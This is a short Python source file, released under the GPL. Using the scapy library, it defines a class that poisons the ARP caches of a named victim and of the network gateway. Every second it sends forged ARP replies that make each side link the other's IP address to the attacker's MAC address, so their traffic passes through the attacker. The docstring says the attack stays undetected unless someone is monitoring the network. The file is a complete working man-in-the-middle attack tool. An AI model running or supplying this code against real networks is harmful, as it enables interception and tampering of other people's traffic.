# Copyright (c) 2012 KernelSanders
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

from scapy.all import *
import time
'''
This  class uses scapy to create two ARP packets, one for the router and one for the victim.
When run, it sends each packet every second. It is a bit noisy, but unless someone is actively
watching the network traffic, or monitoring their arp table, there should be no detectable 
effect from this.
'''
class arpPoisonerClass():
    def __init__(self, victim, gateway):
        self.arpPacket = ARP() # for the victim, ARP() uses our MAC as the default
        self.arpPacket.psrc = gateway # the packet appears to come from the gateway and has our MAC address
        self.arpPacket.pdst = victim
        self.gatewayPacket = ARP() # for the gateway
        self.gatewayPacket.psrc = victim # the packet appears to come from the victim and has our MAC address
        self.gatewayPacket.pdst = gateway
        self.sendPackets = True

    def run(self):
        while self.sendPackets:
            send(self.arpPacket, verbose=0)
            send(self.gatewayPacket, verbose=0)
            time.sleep(1)

    def stop(self):
        self.sendPackets = False
